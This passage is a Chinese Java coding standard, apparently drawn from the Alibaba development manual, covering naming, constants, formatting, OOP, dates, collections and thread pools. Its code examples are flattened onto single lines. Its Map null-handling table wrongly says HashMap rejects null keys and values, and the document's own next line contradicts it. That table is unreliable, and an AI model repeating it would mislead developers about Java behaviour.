说明：子类、父类成员变量名相同，即使是 public 类型的变量也能够通过编译，另外，局部变量在同一方 法内的不同代码块中同名也是合法的，这些情况都要避免。对于非 setter/getter 的参数名称也要避免与成员变量名称相同。
反例：
public class ConfusingName {    public int stock;    // 非setter/getter的参数名称，不允许与本类成员变量同名    public void get(String alibaba) {        if (condition) {            final int money = 666;            // ...        }        for (int i = 0; i &lt; 10; i++) {            // 在同一方法体中，不允许与其它代码块中的money命名相同            final int money = 15978;            // ...        }    }}class Son extends ConfusingName {    // 不允许与父类的成员变量名称相同    public int stock;}


【强制】杜绝完全不规范的缩写，避免望文不知义。
反例：AbstractClass“缩写”成 AbsClass；condition“缩写”成  condi；Function 缩写”成 Fu，此类 随意缩写严重降低了代码的可阅读性。


【推荐】为了达到代码自解释的目标，任何自定义编程元素在命名时，使用尽量完整的单词组 合来表达。
正例：对某个对象引用的 volatile 字段进行原子更新的类名为 AtomicReferenceFieldUpdater。
反例：常见的方法内变量为 int a;的定义方式。


【推荐】在常量与变量的命名时，表示类型的名词放在词尾，以提升辨识度。
正例：startTime / workQueue / nameList / TERMINATED_THREAD_COUNT
反例：startedAt / QueueOfWork / listName / COUNT_TERMINATED_THREAD


【推荐】如果模块、接口、类、方法使用了设计模式，在命名时需体现出具体模式。
说明：将设计模式体现在名字中，有利于阅读者快速理解架构设计理念。
正例：
public class OrderFactory;public class LoginProxy;public class ResourceObserver;


【推荐】接口类中的方法和属性不要加任何修饰符号（public  也不要加），保持代码的简洁 性，并加上有效的 Javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，确定与接口方法相关，并且是整个应用的基础常量。
正例：
接口方法签名  void commit(); 
接口基础常量  String COMPANY = "alibaba";

反例：接口方法定义  public abstract void f(); 
说明：JDK8 中接口允许有默认实现，那么这个 default 方法，是对所有实现类都有价值的默认实现。


接口和实现类的命名有两套规则：


【强制】对于 Service 和 DAO 类，基于 SOA 的理念，暴露出来的服务一定是接口，内部的实现类用 Impl 的后缀与接口区别。
正例：CacheServiceImpl 实现 CacheService 接口。


【推荐】如果是形容能力的接口名称，取对应的形容词为接口名（通常是–able 的形容词）。
正例：AbstractTranslator 实现  Translatable 接口。




【参考】枚举类名带上 Enum 后缀，枚举成员名称需要全大写，单词间用下划线隔开。
说明：枚举其实就是特殊的常量类，且构造方法被默认强制是私有。
正例：枚举名字为 ProcessStatusEnum 的成员名称：SUCCESS / UNKNOWN_REASON。


【参考】各层命名规约


Service/DAO 层方法命名规约
1）  获取单个对象的方法用 get 做前缀。
2）  获取多个对象的方法用 list 做前缀，复数结尾，如：listObjects。
3）  获取统计值的方法用 count 做前缀。
4）  插入的方法用 save/insert 做前缀。
5）  删除的方法用 remove/delete 做前缀。
6）  修改的方法用 update 做前缀。


领域模型命名规约
1）  数据对象：xxxDO，xxx 即为数据表名。
2）  数据传输对象：xxxDTO，xxx 为业务领域相关的名称。
3）  展示对象：xxxVO，xxx 一般为网页名称。
4）  POJO 是 DO/DTO/BO/VO 的统称，禁止命名成 xxxPOJO。




(二)  常量定义


【强制】不允许任何魔法值（即未经预先定义的常量）直接出现在代码中。
反例：
//  本例中，开发者 A 定义了缓存的 key，然后开发者 B 使用缓存时少了下划线，即 key 是"Id#taobao"+tradeId，导致 出现故障 String key = "Id#taobao\_" + tradeId; cache.put(key, value); 


【强制】在 long 或者 Long 赋值时，数值后使用大写字母 L，不能是小写字母 l，小写容易跟 数字混淆，造成误解。
说明：Long a = 2l;  写的是数字的 21，还是 Long 型的 2？


【推荐】不要使用一个常量类维护所有常量，要按常量功能进行归类，分开维护。
说明：大而全的常量类，杂乱无章，使用查找功能才能定位到修改的常量，不利于理解，也不利于维护。
正例：缓存相关常量放在类 CacheConsts 下；系统配置相关常量放在类 SystemConfigConsts 下。


【推荐】常量的复用层次有五层：跨应用共享常量、应用内共享常量、子工程内共享常量、包内共享常量、类内共享常量。
1）  跨应用共享常量：放置在二方库中，通常是 client.jar 中的 constant 目录下。
2）  应用内共享常量：放置在一方库中，通常是子模块中的 constant 目录下。
反例：易懂变量也要统一定义成应用内共享常量，两位工程师在两个类中分别定义了“YES”的变量：
类 A 中：public static final String YES = "yes";类 B 中：public static final String YES = "y";A.YES.equals(B.YES)，预期是 true，但实际返回为 false，导致线上问题。
3）  子工程内部共享常量：即在当前子工程的 constant 目录下。
4）  包内共享常量：即在当前包下单独的 constant 目录下。
5）  类内共享常量：直接在类内部 private static final 定义。


【推荐】如果变量值仅在一个固定范围内变化用 enum 类型来定义。
说明：如果存在名称之外的延伸属性应使用 enum 类型，下面正例中的数字就是延伸信息，表示一年中的 第几个季节。
正例：
public enum SeasonEnum {    SPRING(1), SUMMER(2), AUTUMN(3), WINTER(4);    private int seq;    SeasonEnum(int seq) {        this.seq = seq;    }    public int getSeq() {        return seq;    }} 


(三)  代码格式


【强制】如果是大括号内为空，则简洁地写成{}即可，大括号中间无需换行和空格；如果是非空代码块则：
1）  左大括号前不换行。
2）  左大括号后换行。
3）  右大括号前换行。
4）  右大括号后还有 else 等代码则不换行；表示终止的右大括号后必须换行。


【强制】左小括号和右边相邻字符之间不出现空格；右小括号和左边相邻字符之间也不出现空 格；而左大括号前需要加空格。详见第 5 条下方正例提示。
反例：if (空格 a == b 空格)


【强制】if/for/while/switch/do 等保留字与括号之间都必须加空格。


【强制】任何二目、三目运算符的左右两边都需要加一个空格。
说明：包括赋值运算符=、逻辑运算符&amp;&amp;、加减乘除符号等。


【强制】采用 4 个空格缩进，禁止使用 Tab 字符。
说明：如果使用Tab缩进，必须设置1个Tab为4个空格。IDEA设置Tab为4个空格时，请勿勾选Use tab character；而在Eclipse中，必须勾选insert spaces for tabs。
正例： （涉及1-5 点）
public static void main(String[] args) {    // 缩进4个空格    String say = "hello";    // 运算符的左右必须有一个空格    int flag = 0;    // 关键词if与括号之间必须有一个空格，括号内的f与左括号，0与右括号不需要空格    if (flag == 0) {        System.out.println(say);    }    // 左大括号前加空格且不换行；左大括号后换行    if (flag == 1) {        System.out.println("world");        // 右大括号前换行，右大括号后有else，不用换行    } else {        System.out.println("ok");        // 在右大括号后直接结束，则必须换行    }}


【强制】注释的双斜线与注释内容之间有且仅有一个空格。
正例：
//  这是示例注释，请注意在双斜线之后有一个空格 String commentString = new String(); 


【强制】在进行类型强制转换时，右括号与强制转换值之间不需要任何空格隔开。
正例：
double first = 3.2d; int second = (int)first + 2;    


【强制】单行字符数限制不超过 120 个，超出需要换行，换行时遵循如下原则：
1）第二行相对第一行缩进 4 个空格，从第三行开始，不再继续缩进，参考示例。
2）运算符与下文一起换行。
3）方法调用的点符号与下文一起换行。
4）方法调用中的多个参数需要换行时，在逗号后进行。
5）在括号前不要换行，见反例。
正例：
//  超过 120 个字符的情况下，换行缩进 4 个空格，并且方法前的点号一起换行 sb.append("yang").append("hao")        .append("chen")        .append("chen")        .append("chen");
反例：
StringBuilder sb = new StringBuilder(); //  超过 120 个字符的情况下，不要在括号前换行 sb.append("you").append("are")...append     ("lucky"); //  参数很多的方法调用可能超过 120 个字符，逗号后才是换行处 method(args1, args2, args3, ...     , argsX);


【强制】方法参数在定义和传入时，多个参数逗号后面必须加空格。
正例：下例中实参的 args1，后边必须要有一个空格。
method(args1, args2, args3);  


【强制】IDE的 text file encoding 设置为 UTF-8; IDE中文件的换行符使用 Unix 格式，不要 使用 Windows 格式。


【推荐】单个方法的总行数不超过 80 行。
说明：除注释之外的方法签名、左右大括号、方法内代码、空行、回车及任何不可见字符的总行数不超过 80 行。
正例：代码逻辑分清红花和绿叶，个性和共性，绿叶逻辑单独出来成为额外方法，使主干代码更加清晰；共性逻辑抽取成为共性方法，便于复用和维护。


【推荐】没有必要增加若干空格来使变量的赋值等号与上一行对应位置的等号对齐。
正例：
int one = 1; long two = 2L; float three = 3F; StringBuilder sb = new StringBuilder(); 
说明：增加 sb 这个变量，如果需要对齐，则给 one、two、three 都要增加几个空格，在变量比较多的情 况下，是非常累赘的事情。


【推荐】不同逻辑、不同语义、不同业务的代码之间插入一个空行分隔开来以提升可读性。
说明：任何情形，没有必要插入多个空行进行隔开。


(四)  OOP 规约


【强制】避免通过一个类的对象引用访问此类的静态变量或静态方法，无谓增加编译器解析成 本，直接用类名来访问即可。


【强制】所有的覆写方法，必须加@Override 注解。
说明：getObject()与 get0bject()的问题。一个是字母的 O，一个是数字的 0，加@Override 可以准确判 断是否覆盖成功。另外，如果在抽象类中对方法签名进行修改，其实现类会马上编译报错。


【强制】相同参数类型，相同业务含义，才可以使用 Java 的可变参数，避免使用 Object。
说明：可变参数必须放置在参数列表的最后。（建议开发者尽量不用可变参数编程）
正例：public List listUsers(String type, Long… ids) {…}


【强制】外部正在调用或者二方库依赖的接口，不允许修改方法签名，避免对接口调用方产生 影响。接口过时必须加@Deprecated 注解，并清晰地说明采用的新接口或者新服务是什么。


【强制】不能使用过时的类或方法。
说明：java.net.URLDecoder  中的方法 decode(String encodeStr)  这个方法已经过时，应该使用双参数 decode(String source, String encode)。接口提供方既然明确是过时接口，那么有义务同时提供新的接口； 作为调用方来说，有义务去考证过时方法的新实现是什么。


【强制】Object 的 equals 方法容易抛空指针异常，应使用常量或确定有值的对象来调用 equals。
正例：“test”.equals(object);
反例：object.equals(“test”);
说明：推荐使用 JDK7 引入的工具类 java.util.Objects#equals(Object a, Object b)


【强制】所有整型包装类对象之间值的比较，全部使用 equals 方法比较。
说明：对于 Integer var = ?  在-128 至 127 之间的赋值，Integer 对象是在  IntegerCache.cache 产生， 会复用已有对象，这个区间内的 Integer 值可以直接使用==进行判断，但是这个区间之外的所有数据，都会在堆上产生，并不会复用已有对象，这是一个大坑，推荐使用 equals 方法进行判断。


【强制】任何货币金额，均以最小货币单位且整型类型来进行存储。


【强制】浮点数之间的等值判断，基本数据类型不能用==来比较，包装数据类型不能用 equals 来判断。
说明：浮点数采用“尾数+阶码”的编码方式，类似于科学计数法的“有效数字+指数”的表示方式。二进制无法精确表示大部分的十进制小数，具体原理参考《码出高效》
反例：
float a = 1.0F - 0.9F;float b = 0.9F - 0.8F;if (a == b) {    // 预期进入此代码块，执行其它业务逻辑    // 但事实上a==b的结果为false}Float x = Float.valueOf(a);Float y = Float.valueOf(b);if (x.equals(y)) {    // 预期进入此代码块，执行其它业务逻辑    // 但事实上equals的结果为false}
正例：


指定一个误差范围，两个浮点数的差值在此范围之内，则认为是相等的。
float a = 1.0F - 0.9F;float b = 0.9F - 0.8F;float diff = 1e-6F;if (Math.abs(a - b) &lt; diff) {    System.out.println("true");}


使用 BigDecimal 来定义值，再进行浮点数的运算操作。
BigDecimal a = new BigDecimal("1.0");BigDecimal b = new BigDecimal("0.9");BigDecimal c = new BigDecimal("0.8");BigDecimal x = a.subtract(b);BigDecimal y = b.subtract(c);if (x.compareTo(y) == 0) {    System.out.println("true");}




【强制】如上所示 BigDecimal 的等值比较应使用 compareTo()方法，而不是 equals()方法。
说明：equals()方法会比较值和精度（1.0 与 1.00 返回结果为 false），而 compareTo()则会忽略精度。


【强制】定义数据对象 DO 类时，属性类型要与数据库字段类型相匹配。
正例：数据库字段的 bigint 必须与类属性的 Long 类型相对应。
反例：某个案例的数据库表 id 字段定义类型 bigint unsigned，实际类对象属性为 Integer，随着 id 越来 越大，超过 Integer 的表示范围而溢出成为负数。


【强制】禁止使用构造方法 BigDecimal(double)的方式把 double 值转化为 BigDecimal 对象。
说明：BigDecimal(double)存在精度损失风险，在精确计算或值比较的场景中可能会导致业务逻辑异常。
如：BigDecimal g = new BigDecimal(0.1F);  实际的存储值为：0.10000000149
正例：优先推荐入参为 String 的构造方法，或使用 BigDecimal 的 valueOf 方法，此方法内部其实执行了 Double 的 toString，而 Double 的 toString 按 double 的实际能表达的精度对尾数进行了截断。
BigDecimal recommend1 = new BigDecimal("0.1");BigDecimal recommend2 = BigDecimal.valueOf(0.1);


关于基本数据类型与包装数据类型的使用标准如下：
1）  【强制】所有的 POJO 类属性必须使用包装数据类型。
2）  【强制】RPC 方法的返回值和参数必须使用包装数据类型。
3）  【推荐】所有的局部变量使用基本数据类型。
说明：POJO 类属性没有初值是提醒使用者在需要使用时，必须自己显式地进行赋值，任何 NPE 问题，或者入库检查，都由使用者来保证。
正例：数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险。
反例：某业务的交易报表上显示成交总额涨跌情况，即正负 x%，x 为基本数据类型，调用的 RPC 服务，调用不成功时，返回的是默认值，页面显示为 0%，这是不合理的，应该显示成中划线-。==所以包装数据类型 的 null 值，能够表示额外的信息，如：远程调用失败，异常退出。==


【强制】定义 DO/DTO/VO 等 POJO 类时，不要设定任何属性默认值。
反例：POJO 类的 createTime 默认值为 new Date()，但是这个属性在数据提取时并没有置入具体值，在更新其它字段时又附带更新了此字段，导致创建时间被修改成当前时间


【强制】序列化类新增属性时，请不要修改 serialVersionUID 字段，避免反序列失败；如果完全不兼容升级，避免反序列化混乱，那么请修改 serialVersionUID 值。
说明：注意 serialVersionUID 不一致会抛出序列化运行时异常。


【强制】构造方法里面禁止加入任何业务逻辑，如果有初始化逻辑，请放在 init 方法中。


【强制】POJO 类必须写 toString 方法。使用 IDE 中的工具：source &gt; generate toString 时，如果继承了另一个 POJO 类，注意在前面加一下 super.toString。
说明：在方法执行抛出异常时，可以直接调用 POJO 的 toString()方法打印其属性值，便于排查问题。


【强制】禁止在 POJO 类中，同时存在对应属性 xxx 的 isXxx()和 getXxx()方法。
说明：框架在调用属性 xxx 的提取方法时，并不能确定哪个方法一定是被优先调用到的。


【推荐】使用索引访问用 String 的 split 方法得到的数组时，需做最后一个分隔符后有无内容 的检查，否则会有抛 IndexOutOfBoundsException 的风险。
说明：
String str = "a,b,c,,";String[] ary = str.split(",");//  预期大于 3，结果是 3 System.out.println(ary.length); 


【推荐】当一个类有多个构造方法，或者多个同名方法，这些方法应该按顺序放置在一起，便于阅读，此条规则优先于下一条。


【推荐】  类内方法定义的顺序依次是：公有方法或保护方法  &gt;  私有方法  &gt; getter / setter 方法。
说明：公有方法是类的调用者和维护者最关心的方法，首屏展示最好；保护方法虽然只是子类关心，也可能是“模板设计模式”下的核心方法；而私有方法外部一般不需要特别关心，是一个黑盒实现；因为承载的信息价值较低，所有 Service 和 DAO 的 getter/setter 方法放在类体最后。


【推荐】setter 方法中，参数名称与类成员变量名称一致，this.成员名  =  参数名。在 getter/setter 方法中，不要增加业务逻辑，增加排查问题的难度。
反例：
public Integer getData () {    if (condition) {        return this.data + 100;    } else {        return this.data - 100;    }}


【推荐】循环体内，字符串的连接方式，使用 StringBuilder 的 append 方法进行扩展。
说明：下例中，反编译出的字节码文件显示每次循环都会 new 出一个 StringBuilder 对象，然后进行 append 操作，最后通过 toString 方法返回 String 对象，造成内存资源浪费。
反例：
String str = "start"; for (int i = 0; i &lt; 100; i++) {          str = str + "hello"; }


【推荐】final 可以声明类、成员变量、方法、以及本地变量，下列情况使用 final 关键字：
1）  不允许被继承的类，如：String 类。
2）  不允许修改引用的域对象，如：POJO 类的域变量。
3）  不允许被覆写的方法，如：POJO 类的 setter 方法。
4）  不允许运行过程中重新赋值的局部变量。
5）  避免上下文重复使用一个变量，使用 final 关键字可以强制重新定义一个变量，方便更好地进行重构。


【推荐】慎用 Object 的 clone 方法来拷贝对象。
说明：对象 clone 方法默认是浅拷贝，若想实现深拷贝，需覆写 clone 方法实现域对象的深度遍历式拷贝。


【推荐】类成员与方法访问控制从严：
1）  如果不允许外部直接通过 new 来创建对象，那么构造方法必须是 private。
2）  工具类不允许有 public 或 default 构造方法。
3）  类非 static 成员变量并且与子类共享，必须是 protected。
4）  类非 static 成员变量并且仅在本类使用，必须是 private。
5）  类 static 成员变量如果仅在本类使用，必须是 private。
6）  若是 static 成员变量，考虑是否为 final。
7）  类成员方法只供类内部调用，必须是 private。
8）  类成员方法只对继承类公开，那么限制为 protected。
​    说明：任何类、方法、参数、变量，严控访问范围。过于宽泛的访问范围，不利于模块解耦。思考：如果是一个 private 的方法，想删除就删除，可是一个 public 的 service 成员方法或成员变量，删除一下，不得手心冒点汗吗？变量像自己的小孩，尽量在自己的视线内，变量作用域太大，无限制的到处跑，那么你会担心的。


(五)  日期时间


【强制】日期格式化时，传入 pattern 中表示年份统一使用小写的 y。
说明：日期格式化时，yyyy 表示当天所在的年，而大写的 YYYY代表是 week in which year（JDK7 之后 引入的概念），意思是当天所在的周属于的年份，一周从周日开始，周六结束，只要本周跨年，返回的 YYYY 就是下一年。
正例：表示日期和时间的格式如下所示：
new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")


【强制】在日期格式中分清楚大写的 M 和小写的 m，大写的 H 和小写的 h 分别指代的意义。
说明：日期格式中的这两对字母表意如下：
1）  表示月份是大写的 M；
2）  表示分钟则是小写的 m；
3）  24 小时制的是大写的 H；
4）  12 小时制的则是小写的 h。


【强制】获取当前毫秒数：System.currentTimeMillis();  而不是 new Date().getTime()。
说明：如果想获取更加精确的纳秒级时间值，使用 System.nanoTime 的方式。在 JDK8 中，针对统计时间 等场景，推荐使用 Instant 类。


【强制】不允许在程序任何地方中使用：
1）java.sql.Date  ：不记录时间，getHours()抛出异常
2）java.sql.Time ：不记录日期，getYear()抛出异常
3）java.sql.Timestamp：构造方法 super((time/1000)*1000)，在 Timestamp 属性 fastTime 和 nanos 分别存储秒和纳秒信息
反例：  java.util.Date.after(Date)进行时间比较时，当入参是 java.sql.Timestamp时，会触发 JDK BUG(JDK9 已修复)，可能导致比较时的意外结果。


【强制】不要在程序中写死一年为 365 天，避免在公历闰年时出现日期转换错误或程序逻辑 错误。
正例：
//  获取今年的天数 int daysOfThisYear = LocalDate.now().lengthOfYear();//  获取指定某年的天数 LocalDate.of(2011, 1, 1).lengthOfYear();
反例：
//  第一种情况：在闰年 366 天时，出现数组越界异常 int[] dayArray = new int[365];  //  第二种情况：一年有效期的会员制，今年 1 月 26 日注册，硬编码 365 返回的却是 1 月 25 日 Calendar calendar = Calendar.getInstance(); calendar.set(2020, 1, 26);  calendar.add(Calendar.DATE, 365);  


【推荐】避免公历闰年 2 月问题。闰年的 2 月份有 29 天，一年后的那一天不可能是 2 月 29 日。


【推荐】使用枚举值来指代月份。如果使用数字，注意 Date，Calendar 等日期相关类的月份 month 取值在 0-11 之间。
说明：参考 JDK 原生注释，Month value is 0-based. e.g., 0 for January.
正例： Calendar.JANUARY，Calendar.FEBRUARY，Calendar.MARCH 等来指代相应月份来进行传参或比较。


(六)  集合处理


【强制】关于 hashCode 和 equals 的处理，遵循如下规则：

只要覆写 equals，就必须覆写 hashCode。
因为 Set 存储的是不重复的对象，依据 hashCode 和 equals 进行判断，所以 Set 存储的对象必须覆写这两种方法。
如果自定义对象作为 Map 的键，那么必须覆写 hashCode 和 equals。

说明：String 因为覆写了 hashCode 和 equals 方法，所以可以愉快地将 String 对象作为 key 来使用。


【强制】判断所有集合内部的元素是否为空，使用 isEmpty()方法，而不是 size()==0 的方式。
说明：在某些集合中，前者的时间复杂度为 O(1)，而且可读性更好。
正例：
Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(16);if (map.isEmpty()) {    System.out.println("no element in this map.");}


【强制】在使用 java.util.stream.Collectors 类的 toMap()方法转为 Map 集合时，一定要使用含有参数BinaryOperator&lt;U&gt; mergeFunction 的方法，用于说明key重复时的策略，否则当出现相同 key 值时会抛出 IllegalStateException 异常。
说明：参数 mergeFunction 的作用是当出现 key 重复时，自定义对 value 的处理策略。
正例：
List&lt;Pair&lt;String, Double&gt;&gt; pairArrayList = new ArrayList&lt;&gt;(3);pairArrayList.add(new Pair&lt;&gt;("version", 12.10));pairArrayList.add(new Pair&lt;&gt;("version", 12.19));pairArrayList.add(new Pair&lt;&gt;("version", 6.28));//  生成的 map 集合中只有一个键值对：{version=6.28}Map&lt;String, Double&gt; map = pairArrayList.stream().collect(        Collectors.toMap(Pair::getKey, Pair::getValue, (v1, v2) -&gt; v2));System.out.println(map);
反例：
String[] departments = new String[]{"iERP", "iERP", "EIBU"};//  抛出 IllegalStateException 异常Map&lt;Integer, String&gt; map = Arrays.stream(departments)        .collect(Collectors.toMap(String::hashCode, str -&gt; str));


【强制】在使用 java.util.stream.Collectors 类的 toMap()方法转为 Map 集合时，一定要注意当 value 为 null 时会抛 NPE 异常。
说明：在 java.util.HashMap 的 merge 方法里会进行如下的判断：
if (value == null || remappingFunction == null)     throw new NullPointerException(); 
反例：
List&lt;Pair&lt;String, Double&gt;&gt; pairArrayList = new ArrayList&lt;&gt;(2);pairArrayList.add(new Pair&lt;&gt;("version1", 8.3));pairArrayList.add(new Pair&lt;&gt;("version2", null));//  抛出 NullPointerException 异常Map&lt;String, Double&gt; map = pairArrayList.stream().collect(        Collectors.toMap(Pair::getKey, Pair::getValue, (v1, v2) -&gt; v2));


【强制】ArrayList 的 subList 结果不可强转成 ArrayList，否则会抛出 ClassCastException 异 常：java.util.RandomAccessSubList cannot be cast to java.util.ArrayList
说明：==subList()返回的是 ArrayList 的内部类 SubList==，并不是  ArrayList 本身，而是 ArrayList  的一个视 图，对于 SubList 的所有操作最终会反映到原列表上。


【强制】使用 Map 的方法 keySet()/values()/entrySet()返回集合对象时，不可以对其进行添加元素操作，否则会抛出 UnsupportedOperationException 异常。


【强制】Collections 类返回的对象，如：emptyList()/singletonList()等都是 immutable list， 不可对其进行添加或者删除元素的操作。
反例：如果查询无结果，返回 Collections.emptyList() 空集合对象，调用方一旦进行了添加元素的操作，就会触发 UnsupportedOperationException 异常。


【强制】在 subList 场景中，高度注意对父集合元素的增加或删除，均会导致子列表的遍历、 增加、删除产生 ConcurrentModificationException  异常。


【强制】使用集合转数组的方法，必须使用集合的 toArray(T[] array)，传入的是类型完全一 致、长度为 0 的空数组。
反例：直接使用 toArray 无参方法存在问题，此方法返回值只能是 Object[]类，若强转其它类型数组将出现 ClassCastException 错误。
正例：
List&lt;String&gt; list = new ArrayList&lt;&gt;(2);list.add("guan");list.add("bao");String[] array = list.toArray(new String[0])
说明：使用 toArray 带参方法，数组空间大小的 length
1） 等于 0，动态创建与 size 相同的数组，性能最好。
2）  大于 0 但小于 size，重新创建大小等于 size 的数组，增加 GC 负担。
3）  等于 size，在高并发情况下，数组创建完成之后，size 正在变大的情况下，负面影响与 2 相同。
4）  大于 size，空间浪费，且在 size 处插入 null 值，存在 NPE 隐患。


【强制】在使用 Collection 接口任何实现类的 addAll()方法时，都要对输入的集合参数进行 NPE 判断。
说明：在 ArrayList#addAll 方法的第一行代码即 Object[] a = c.toArray(); 其中 c 为输入集合参数，如果 为 null，则直接抛出异常。


【强制】使用工具类 Arrays.asList()把数组转换成集合时，不能使用其修改集合相关的方法， 它的 add/remove/clear 方法会抛出 UnsupportedOperationException 异常。
说明：==asList 的返回对象是一个 Arrays 内部类，并没有实现集合的修改方法。Arrays.asList 体现的是适配器模式，只是转换接口，后台的数据仍是数组==
String[] str = new String[]{"chen", "yang", "hao"};List&lt;String&gt; list = Arrays.asList(str);// 第一种情况：list也会随之修改，反之亦然。str[0] = "change";System.out.println(list.get(0));// 第二种情况：运行时异常list.add("yangguanbao");


【强制】泛型通配符&lt;? extends T&gt;来接收返回的数据，此写法的泛型集合不能使用 add 方法， 而&lt;? super T&gt;不能使用 get 方法，两者在接口调用/赋值的场景中容易出错。
说明：扩展说一下 ==PECS(Producer Extends Consumer Super)原则==
第一、频繁往外读取内容的，适合用 &lt;? extends T&gt;
第二、经常往里插入的，适合用&lt;? super T&gt;


【强制】在无泛型限制定义的集合赋值给泛型限制的集合时，在使用集合元素时，需要进行 instanceof 判断，避免抛出 ClassCastException 异常。
说明：毕竟泛型是在 JDK5 后才出现，考虑到向前兼容，编译器是允许非泛型集合与泛型集合互相赋值。
反例：
List&lt;String&gt; generics = null;List notGenerics = new ArrayList(10);notGenerics.add(new Object());notGenerics.add(new Integer(1));generics = notGenerics;//  此处抛出 ClassCastException 异常String string = generics.get(0);


【强制】不要在 foreach 循环里进行元素的 remove/add 操作。remove 元素请使用 Iterator 方式，如果并发操作，需要对 Iterator 对象加锁。
正例：
 List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add("1");list.add("2");Iterator&lt;String&gt; iterator = list.iterator();while (iterator.hasNext()) {    String item = iterator.next();    if (删除元素的条件) {        iterator.remove();    }}
反例：
 for (String item : list) {    if ("1".equals(item)) {        // 正常remove        list.remove(item);    }}
说明：以上代码的执行结果肯定会出乎大家的意料，那么试一下把“1”换成“2”，会是同样的结果吗？


【强制】在 JDK7 版本及以上，Comparator 实现类要满足如下三个条件，不然 Arrays.sort， Collections.sort 会抛 IllegalArgumentException 异常。
说明：三个条件如下
1）  x，y 的比较结果和 y，x 的比较结果相反。
2）  x&gt;y，y&gt;z，则 x&gt;z。
3）  x=y，则 x，z 比较结果和 y，z 比较结果相同。
反例：下例中没有处理相等的情况，交换两个对象判断结果并不互反，不符合第一个条件，在实际使用中    可能会出现异常。
new Comparator&lt;Student&gt;() {    @Override    public int compare(Student o1, Student o2) {        return o1.getId() &gt; o2.getId() ? 1 : -1;    }};


【推荐】集合泛型定义时，在 JDK7 及以上，使用 diamond 语法或全省略。
说明：菱形泛型，即 diamond，直接使用&lt;&gt;来指代前边已经指定的类型。
正例：
HashMap&lt;String, String&gt; userCache = new HashMap&lt;&gt;(16); //  全省略方式ArrayList&lt;User&gt; users = new ArrayList(10); 


【推荐】集合初始化时，指定集合初始值大小。
说明：HashMap 使用 HashMap(int initialCapacity)  初始化，如果暂时无法确定集合大小，那么指定默 认值（16）即可。
正例：==initialCapacity = (需要存储的元素个数  /  负载因子) + 1==。注意负载因子（即 loader factor）默认 为 0.75，如果暂时无法确定初始值大小，请设置为 16（即默认值）。
反例：  HashMap 需要放置 1024 个元素，由于没有设置容量初始大小，随着元素增加而被迫不断扩容， resize()方法总共会调用 8 次，反复重建哈希表和数据迁移。当放置的集合元素个数达千万级时会影响程序性能。


【推荐】使用 entrySet 遍历 Map 类集合 KV，而不是 keySet 方式进行遍历
说明：keySet 其实是遍历了 2 次，一次是转为 Iterator 对象，另一次是从 hashMap 中取出 key 所对应的 value。而 entrySet 只是遍历了一次就把 key 和 value 都放到了 entry 中，效率更高。如果是 JDK8，使用 Map.forEach 方法。
正例：values()返回的是 V值集合，是一个 list 集合对象；keySet()返回的是 K值集合，是一个 Set 集合对象；entrySet()返回的是 K-V值组合集合。


【推荐】高度注意 Map 类集合 K/V 能不能存储 null 值的情况，如下表格：



集合类
Key
Value
Super
说明




Hashtable
不允许为 null
不允许为 null
Dictionary
线程安全


ConcurrentHashMap
不允许为 null
不允许为 null
AbstractMap
锁分段技术（JDK8:CAS）


TreeMap
不允许为 null
不允许为 null
AbstractMap
线程不安全


HashMap
不允许为 null
不允许为 null
AbstractMap
线程不安全



反例：由于 HashMap 的干扰，很多人认为 ConcurrentHashMap 是可以置入 null 值，而事实上，存储 null 值时会抛出 NPE 异常。


【参考】合理利用好集合的有序性(sort)和稳定性(order)，避免集合的无序性(unsort)和不稳 定性(unorder)带来的负面影响。
说明：有序性是指遍历的结果是按某种比较规则依次排列的。稳定性指集合每次遍历的元素次序是一定的。 如：ArrayList 是 order/unsort；HashMap 是 unorder/unsort；TreeSet 是 order/sort。


【参考】利用 Set 元素唯一的特性，可以快速对一个集合进行去重操作，避免使用 List 的 contains()进行遍历去重或者判断包含操作。


(七)  并发处理


【强制】获取单例对象需要保证线程安全，其中的方法也要保证线程安全。
说明：资源驱动类、工具类、单例工厂类都需要注意。


【强制】创建线程或线程池时请指定有意义的线程名称，方便出错时回溯。
正例：自定义线程工厂，并且根据外部特征进行分组，比如，来自同一机房的调用，把机房编号赋值给 whatFeatureOfGroup
public class UserThreadFactory implements ThreadFactory {    private final String namePrefix;    private final AtomicInteger nextId = new AtomicInteger(1);    //  定义线程组名称，在利用 jstack 来排查问题时，非常有帮助    UserThreadFactory(String whatFeatureOfGroup) {        namePrefix = "From UserThreadFactory's " + whatFeatureOfGroup + "-Worker-";    }    @Override    public Thread newThread(Runnable task) {        String name = namePrefix + nextId.getAndIncrement();        Thread thread = new Thread(null, task, name, 0);        System.out.println(thread.getName());        return thread;    }}


【强制】线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。
说明：线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源的开销，解决资源不足的问题。 如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。


【强制】线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。
说明：Executors 返回的线程池对象的弊端如下：
1）  FixedThreadPool 和 SingleThreadPool：
允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。
2）  CachedThreadPool：
允许的创建线程数量为 Integer.MAX_VALUE，可能会创建大量的线程，从而导致 OOM。


【强制】SimpleDateFormat  是线程不安全的类，一般不要定义为 static 变量，如果定义为 static， 必须加锁，或者使用 DateUtils 工具类。
正例：注意线程安全，使用 DateUtils。亦推荐如下处理：
private static final ThreadLocal&lt;DateFormat&gt; df = new ThreadLocal&lt;DateFormat&gt;() {    @Override    protected DateFormat initialValue() {        return new SimpleDateFormat("yyyy-MM-dd");    }};
说明：如果是 JDK8 的应用，==可以使用 Instant 代替 Date，LocalDateTime 代替 Calendar， DateTimeFormatter 代替 SimpleDateFormat==，官方给出的解释：simple beautiful strong immutable thread-safe。


【强制】必须回收自定义的 ThreadLocal 变量，尤其在线程池场景下，线程经常会被复用， 如果不清理自定义的 ThreadLocal 变量，可能会影响后续业务逻辑和造成内存泄露等问题。 尽量在代理中使用 try-finally 块进行回收。
正例：
objectThreadLocal.set(userInfo); try {    // ... } finally {    objectThreadLocal.remove(); }


